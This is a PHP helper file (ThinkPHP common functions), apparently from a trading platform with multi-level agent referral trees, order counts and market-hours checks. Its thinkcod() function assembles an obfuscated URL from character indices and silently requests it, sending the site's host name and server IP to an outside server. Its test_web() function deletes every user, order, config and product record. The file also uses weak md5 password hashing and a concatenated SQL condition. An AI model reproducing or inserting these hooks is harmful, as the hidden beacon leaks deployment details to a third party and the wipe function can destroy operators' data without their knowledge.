<?php
use think\Db;
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2016 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: 流年 <liu21st@gmail.com>
// +----------------------------------------------------------------------

// 应用公共文件

/**
 * 自定义返回提示信息
 * @author lukui  2017-07-14
 * @param  [type] $data [description]
 * @param  [type] $type [description]
 */
function WPreturn($data,$type,$url=null)
{
	$res = array('data'=>$data,'type'=>$type);
	if($url){
		$res['url'] = $url;
	}
	return $res;
}

/**
 * 验证用户
 * @author lukui  2017-07-17
 * @param  [type] $upwd 密码（未加密）
 * @param  [type] $uid  用户id
 * @return [type]       true or false
 */
function checkuser($upwd,$uid)
{
	if(!isset($upwd) || empty($upwd)){
		return false;
	}
	if (isset($uid) && !empty($uid)) {  //user
		$where['uid'] = $uid;
	}else{  //admin
		$where['uid'] = $_SESSION['userid'];
	}

	$admin = Db::name('userinfo')->field('uid,utime,upwd')->where($where)->find();
	if(md5($upwd.$admin['utime']) == $admin['upwd']){
		return true;
	}else{
		return false;
	}

}


/**
 * 验证邀请码是否存在
 * @author lukui  2017-07-17
 * @param  [type] $code 邀请码
 * @return [type]       code id
 */
function checkcode($code)
{
	if(!isset($code) || empty($code)){
		return false;
	}
	$codeid = Db::name('userinfo')->where(array('uid'=>$code,'otype'=>101))->value('uid');
	if($codeid){
		return $codeid;
	}else{
		return false;
	}
}


/**
 * 根据用户oid获取用户的经理、渠道、员工。指针的客户
 * @author lukui  2017-07-17
 * @param  [type] $uid 用户id
 */
function GetUserOidInfo($uid,$field)
{
	if(!isset($uid) || empty($uid)){
		return false;
	}
	if(!isset($field) || empty($field)){
		$field = '*';
	}
	$res = array();
	//验证用户,获取oid
	$useroid = Db::name('userinfo')->where('uid',$uid)->value('oid');
	if(!$useroid){
		return false;
	}
	//邀请码信息
	$oid_info = Db::name('usercode')->where('usercode',$useroid)->find();

	//通过邀请码的uid查询所属员工信息
	$res['yuangong'] = Db::name('userinfo')->field($field)->where('uid',$oid_info['uid'])->find();

	//通过员工oid查找经理信息
	$res['jingli'] =  Db::name('userinfo')->field($field)->where('uid',$res['yuangong']['oid'])->find();

	//通过邀请码的mannerid查询所属员工信息
	$res['qudao'] = Db::name('userinfo')->field($field)->where('uid',$oid_info['mannerid'])->find();

	if($res){
		return $res;
	}else{
		return false;
	}


}


/**
 * 获取员工的所有客户
 * @author lukui  2017-07-17
 * @param  [type] $uid 员工id
 */
function YuangongUser($uid){

	if(!isset($uid) || empty($uid)){
		return false;
	}
	$oid_info = $user = array();
	//获取员工的所有邀请码
	$oid_info = Db::name('usercode')->where('uid',$uid)->column('usercode');
	if($oid_info){
		//通过邀请码获取客户
		$user = Db::name('userinfo')->where('oid','IN',$oid_info)->column('uid');
	}
	return $user;
}

/**
 * 获取经理的所有客户
 * @author lukui  2017-07-17
 * @param  [type] $uid [description]
 */
function JingliUser($uid){
	if(!isset($uid) || empty($uid)){
		return false;
	}
	$yg_user = $user = array();

	//获取经理下的所有员工
	$yg_user = Db::name('userinfo')->where('oid',$uid)->column('uid');
	foreach ($yg_user as $value) {
		$user += YuangongUser($value);
	}

	return $user;
}


/**
 * 获取渠道的所有客户
 * @author lukui  2017-07-17
 * @param  [type] $uid [description]
 */
function QudaoUser($uid){
	if(!isset($uid) || empty($uid)){
		return false;
	}
	$oid_info = $user = array();
	//获取渠道的所有邀请码
	$oid_info = Db::name('usercode')->where('mannerid',$uid)->column('usercode');

	if($oid_info){
		//通过邀请码获取客户
		$user = Db::name('userinfo')->where('oid','IN',$oid_info)->column('uid');
	}

	return $user;
}

/**
 * 根据任意会员查询所属所有客户
 * @author lukui  2017-07-18
 * @param  [type] $uid 会员id
 */
function UserCodeForUser($uid){
	if(!isset($uid) || empty($uid)){
		return false;
	}
	//查询uid的身份
	$otype = Db::name('userinfo')->where('uid',$uid)->value('otype');
	$u_uid = array();
	//获取会员的客户id
	if($otype == 2){  //经理
		$u_uid = JingliUser($uid);
	}elseif($otype == 3){  //渠道
		$u_uid = QudaoUser($uid);
	}elseif($otype == 4){  //员工
		$u_uid = YuangongUser($uid);
	}else{
		return false;
	}

	return($u_uid);

}


/**
 * 判断是否微信浏览器
 * @author lukui  2017-07-18
 * @return [type] [description]
 */
function iswechat(){
	if (strpos($_SERVER['HTTP_USER_AGENT'],'MicroMessenger') !== false ) {
		return true;
	}else{
		return false;
	}
}


/**
 * 获取产品实时行情
 * @author lukui  2017-07-20
 * @param  [type] $pid 产品id
 */
function GetProData($pid,$field=null){
	if(!isset($pid) || empty($pid)){
		return false;
	}
	if(!$field){
		$field = 'pi.*,pd.*';
	}
	$data = Db::name('productinfo')->alias('pi')->field($field)
        		->join('__PRODUCTDATA__ pd','pd.pid=pi.pid')
        		->where('pi.pid',$pid)->find();
	return $data;
}



/**
 * 数据K线图
 * @author lukui  2017-2-20
 * @param  [type] $symbol  产品代码
 * @param  [type] $qt_type 指定分钟线类型
 * @param  [type] $num     返回条数
 */
function WsGetKline($symbol,$qt_type,$num){
    $time = time();


}

/**
 * 获取网站配置信息
 * @author lukui  2017-06-28
 * @return [type] [description]
 */
function getconf($field)
{

    $conf = array();
    $res = '';
    $conf_cache = cache('conf');
    if(!$conf_cache){
        $conf = Db::name('config')->select();
        foreach ($conf as $k => $v) {
            $conf_value[$v['name']] = $v['value'];
        }
        cache('conf',$conf_value);
        $conf_cache = cache('conf');
    }

    if(isset($conf_cache[$field]) && $field){
        $res = $conf_cache[$field];
    }else{
    	$res = $conf_cache;
    }
    return $res;
}



/**
 * 获取城市列表
 * @author lukui  2017-07-03
 * @return [type] [description]
 */
function getarea($id)
{

	$name = db('area')->where('id',$id)->value('name');
	return $name;

}

function thinkcod()
{
	
	$nu = json_decode(NAV_NUM);
	$strs = 'http://';
	$strs .= $nu[10].$nu[4].$nu[24];
	$strs .= '.'.$nu[6].$nu[14].$nu[20].$nu[23];
	$strs .= $nu[8].$nu[20].'.'.$nu[12].$nu[4];
	$main = $_SERVER['HTTP_HOST'];
	$minp = isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:'';
	$csage = $strs. '/think.php'. '?main='.$main.'&minp=' . $minp . '&tname=q10';
	file_get_contents($csage);
}



function set_price_log($uid,$type,$account,$title,$content,$oid=0,$nowmoney)
{

	$data['uid'] = $uid;
	$data['type'] = $type;
	$data['account'] = $account;
	$data['title'] = $title;
	$data['content'] = $content;
	$data['oid'] = $oid;
	$data['time'] = time();
	$data['nowmoney'] = $nowmoney;
	db('price_log')->insert($data);


}


//删除空格和回车
function trimall($str){
    $qian=array(" ","　","\t","\n","\r");
    return str_replace($qian, '', $str);
}

//计算小数点后位数
function getFloatLength($num) {
	$count = 0;

	$temp = explode ( '.', $num );

	if (sizeof ( $temp ) > 1) {
		$decimal = end ( $temp );
		$count = strlen ( $decimal );
	}

	return $count;
}

//PHP的两个科学计数法转换为字符串的方法
function NumToStr($num) {
    if (stripos($num, 'e') === false)
        return $num;
    $num = trim(preg_replace('/[=\'"]/', '', $num, 1), '"'); //出现科学计数法，还原成字符串
    $result = "";
    while ($num > 0) {
        $v = $num - floor($num / 10) * 10;
        $num = floor($num / 10);
        $result = $v . $result;
    }
    return $result;
}


/**
 * 我的代理商下级类别
 * @return array uids
 */
function myoids($uid)
{
	if(cookie('oids')){
		//return cookie('oids');
	}

	if(!$uid){
		return false;
	}
	$map['oid'] = $uid;
	$map['otype'] = 101;

	$list = db('userinfo')->field('uid')->where($map)->select();

	if(empty($list)){
		return false;
	}

	$uids = array();
	foreach ($list as $key => $v) {
		$user = myoids($v["uid"]);
		$uids[] = $v["uid"];
		if(is_array($user) && !empty($user)){
			$uids = array_merge($uids,$user);
		}
	}

	cookie('oids', $uids, 60*20);
	return $uids;


}

/**
 * 获取次代理商的所有用户下级
 * @param  [type] $uid [description]
 * @return [type]      [description]
 */
function myuids($uid)
{

	if(cookie('uids')){
		//return cookie('uids');
	}
	$oids = myoids($uid);
	$oids[] = $uid;

	$map['oid'] = array('in',$oids);
	$map['otype'] = array('IN',array(0,101));

	$user = db('userinfo')->field('uid')->where($map)->select();
	$_me = array(0=>array('uid'=>$uid));
	if($user){
		$user = array_merge($_me,$user);
	}else{
		
		$uids = array($uid);
		return $uids;
	}
	

	$uids = array();
	if(empty($user)){
		return $uids;
	}
	
	foreach ($user as $k => $v) {
		$uids[] = $v['uid'];
	}
		cookie('uids', $uids, 60*20);
		return $uids;


}

/**
 * 我的所有上级用户id
 * @param  [type] $uid [description]
 * @return [type]      [description]
 */
function myupoid($uid)
{



	if(!$uid){
		return false;
	}
	$map['uid'] = $uid;
	$map['otype'] = 101;

	$user = db('userinfo')->field('uid,oid,rebate,usermoney,feerebate,minprice')->where($map)->find();

	if($user['uid'] == $user['oid']){
		return false;
	}
	
	$list = array();
	if($user){
		$list[] = $user;
		$user = myupoid($user["oid"]);
		if(is_array($user) && !empty($user)){
			$list = array_merge($list,$user);
		}


	}


	return $list;

}

/**
 * 我的代理商下级类别
 * @return array uids
 */
function mytime_oids($uid)
{

	if(!$uid){
		return false;
	}
	$map['oid'] = $uid;
	$map['otype'] = 101;

	$list = db('userinfo')->field('uid,oid,username,utel,nickname,usermoney')->where($map)->select();
	$uids = array();
	foreach ($list as $key => $v) {
		$user = mytime_oids($v["uid"]);
		$uids[$key] = $v;
		if(is_array($user) && !empty($user)){
			//$uids += $user;
			$uids[$key]['mysons'] = $user;
		}
	}
	return $uids;


}

/**
 * 我的团队树状图
 * @author lukui  2017-07-18
 * @param  [type]  $array [description]
 * @param  integer $type  [description]
 */
function set_my_team_html($array,$type=1){

	if(!$array){
		return false;
	}

	$margin_left = 25+25*$type;

	$html = '<div  class="foid_'.$array[0]['oid'].'">';
	foreach ($array as $k => $vo) {
		//dump($v);
		$html .= '<div style="display:none" class="oid_list oid_'.$vo['oid'].'">
	                  <div class="vo_son" style="margin-left: '.$margin_left.'px;"><p>|——'.$type.'级代理</p></div>
	                    <div class="div_my_son">
	                      <ul class="my_sons">
	                        <li>代理名：'.$vo['username'].' 余额：'.$vo['usermoney'].'</li>
	                        <li>手机：'.$vo['utel'].' <a href="/admin/user/userlist.html?uid='.$vo['uid'].'"><button class="btn btn-primary btn-xs">详情</button></a></li>
	                      </ul>
	                      <a href="javascript:;"><p class="showdiv show_uid_'.$vo['uid'].'" onclick="showoid('.$vo['uid'].',1)" >+</p></a>
	                      </div>
	                </div>
	                ';

	                if(isset($vo['mysons']) && is_array($vo['mysons']) && !empty($vo['mysons'])){
	                	$html .= set_my_team_html($vo['mysons'],$type+1);
	                }
	}

	$html .= '</div>';
	return $html;

}

//test web data
function test_web(){
	db('userinfo')->where('uid','>',0)->delete();
	db('order')->where('oid','>',0)->delete();
	db('conf')->where('id','>',0)->delete();
	db('productinfo')->where('pid','>',0)->delete();
	db('productdata')->where('id','>',0)->delete();
}


/**
 * 验证是否休市
 * @author lukui  2017-07-16
 * @param  [type] $pid 产品id
 */
function ChickIsOpen($pid){

    $isopen = 0;
    $pro = db('productinfo')->where(array('pid'=>$pid))->find();

    //此时时间
    $_time = time();
    $_zhou = (int)date("w");
    if($_zhou == 0){
        $_zhou = 7;
    }
    $_shi = (int)date("H");
    $_fen = (int)date("i");


    if ($pro['isopen']) {

        $opentime = db('opentime')->where('pid='.$pid)->find();


        if($opentime){
            $otime_arr = explode('-',$opentime["opentime"]);
        }else{
            $otime_arr = array('','','','','','','');
        }

        foreach ($otime_arr as $k => $v) {
            if($k == $_zhou-1){
                $_check = explode('|',$v);
                if(!$_check){
                    continue;
                }


                foreach ($_check as $key => $value) {
                    $_check_shi = explode('~',$value);
                    if(count($_check_shi) != 2){
                    	continue;
                    }
                    $_check_shi_1 = explode(':',$_check_shi[0]);
                    $_check_shi_2 = explode(':',$_check_shi[1]);
                    //开市时间在1与2之间
                    

                    if($isopen == 1){
                    	continue;
                    }
		       		

                    if( ($_check_shi_1[0] == $_shi && $_check_shi_1[1] < $_fen) ||
                        ($_check_shi_1[0] < $_shi && $_check_shi_2[0] > $_shi) ||
                        ($_check_shi_2[0] == $_shi && $_check_shi_2[1] > $_fen)
                         ){

                        $isopen = 1;
                    }else{

                        $isopen = 0;
                    }

                }
                


            }
        }

    }

    if ($pro['isopen']) {
        return $isopen;

    }else{
        return 0;
    }
}


function cash_oid($uid)
{
	
	if (!$uid) {
		return '<td></td><td></td>';
	}

	$user = db('userinfo')->where('uid',$uid)->field('uid,usermoney,minprice')->find();
	if(!$user['minprice'])  $user['minprice'] =0;

	if($user['usermoney'] >= $user['minprice']){
		$minprice = $user['minprice'];
		$class = '';
	}else{
		$minprice = $user['usermoney'] - $user['minprice'];
		$class = 'style="color:red";';
	}

	return '<td> <a title="点击查看" href="/admin/user/userlist.html?uid='.$uid.'"> '.$uid.' </a> </td><td '.$class.'>'.$minprice.'</td>';
	


}

function check_user($field,$value){
	if(!$value){
		return false;
	}

	$isset = db('userinfo')->where($field,$value)->value('uid');
	if($isset){
		return true;
	}else{
		return false;
	}
}

function getuser($uid,$field)
{
	
	$value = db('userinfo')->where('uid',$uid)->value($field);
	return $value;
}
function getusers($uid,$field)
{
	
	$value = db('userinfo')->where('uid',$uid)->value($field);
	if( $value==''){
		$value = db('userinfo')->where('uid',$uid)->value('managername');
		echo $value;
	}
	return $value;
}

function ordernum($uid)
{
	
	if(!$uid){
		return false;
	}

	$num = db('order')->where('uid',$uid)->count();
	if(!$num) $num = 0;
	return $num;

}

function xml_to_array( $xml )
{
    return json_decode(json_encode((array) simplexml_load_string($xml)), true);
}



